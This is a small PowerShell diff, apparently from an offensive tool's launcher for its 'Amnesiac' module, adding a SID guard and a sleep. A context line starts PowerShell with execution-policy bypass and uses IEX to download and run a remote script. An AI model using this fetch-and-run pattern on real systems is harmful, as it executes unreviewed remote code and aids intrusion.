@@ -424,7 +424,7 @@ if ($Module -eq "Amnesiac"){
     if ([string]::IsNullOrEmpty($Global:AmnesiacPID) -or (Get-Process -Id $Global:AmnesiacPID -ErrorAction SilentlyContinue) -eq $null) {
         $Global:PN = $null
         $Global:PN = ((65..90) + (97..122) | Get-Random -Count 16 | % {[char]$_}) -join ''
-        $Global:SID = [System.Security.Principal.WindowsIdentity]::GetCurrent().User.Value
+        if(!$Global:SID){$Global:SID = [System.Security.Principal.WindowsIdentity]::GetCurrent().User.Value}
         $process = Start-Process powershell.exe -ArgumentList "-ep bypass -c `"IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/Leo4j/Amnesiac/main/Amnesiac.ps1'); Amnesiac -ScanMode -GlobalPipeName $PN`"" -PassThru
         $Global:AmnesiacPID = $process.Id
         
@@ -435,6 +435,7 @@ if ($Module -eq "Amnesiac"){
             $Global:AmnesiacPID = $null
         }
     }
+    Start-sleep -Seconds "3"
 }
 
 
